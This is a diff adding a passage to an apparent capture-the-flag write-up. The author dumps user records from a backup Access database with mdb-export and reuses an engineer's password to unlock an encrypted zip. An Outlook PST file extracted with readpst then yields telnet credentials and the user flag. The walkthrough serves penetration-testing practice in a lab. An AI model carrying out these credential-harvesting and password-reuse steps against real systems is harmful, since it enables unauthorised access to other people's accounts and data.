@@ -44,9 +44,50 @@ CREATE TABLE [auth_user]
 ```
 Now we know the interesting table name - auth_users.
 Let's export it and see what we have:
+```
+root@kali:~/Documents# mdb-export backup.mdb auth_user
+id,username,password,Status,last_login,RoleID,Remark
+25,"admin","**",1,"08/23/18 21:11:47",26,
+27,"engineer","**",1,"08/23/18 21:13:36",26,
+28,"backup_admin","**",1,"08/23/18 21:14:02",26,
+```
+I thought these credentials would log me into the ftp server, but it seems that the ftp server is configured to anonymous logins only. I guess we are left only with the second file, so I downloaded it. It is encrypted with AES and the default linux unzip program doesn't support password extraction of this kind (the file was probably encrypted in Windows system). Therefore, one can download a tool called 7z. Kali comes with it preloaded. I tried engineer's password (the file was located in Engineer) and it worked:
+```
+ftp>get 'Access Control.zip'
+root@kali:~/Documents# 7z x control.zip
 
+7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,1 CPU Intel(R) Core(TM) i7-7500U CPU @ 2.70GHz (806E9),ASM,AES-NI)
 
+Scanning the drive for archives:
+1 file, 10870 bytes (11 KiB)
 
+Extracting archive: control.zip
+--
+Path = control.zip
+Type = zip
+Physical Size = 10870
+
+    
+Enter password (will not be echoed):
+Everything is Ok         
+
+Size:       271360
+Compressed: 10870
+```
+Now we have a .pst file, which is Microsoft Outlook email folder. Googling for it leads to a program named readpst:
+```
+root@kali:~/Documents# readpst 'Access Control.pst' 
+Opening PST file and indexes...
+Processing Folder "Deleted Items"
+	"Access Control" - 2 items done, 0 items skipped.
+```
+Now we have the email file itself. It contains a username and a password. It's probably for the telnet. Let's proceeed:
+```
+C:\Users\security\Desktop>type user.txt
+***
+```
+After searching for interesting files I have found this one in the desktop. It seems like a hash. 
 
 
 
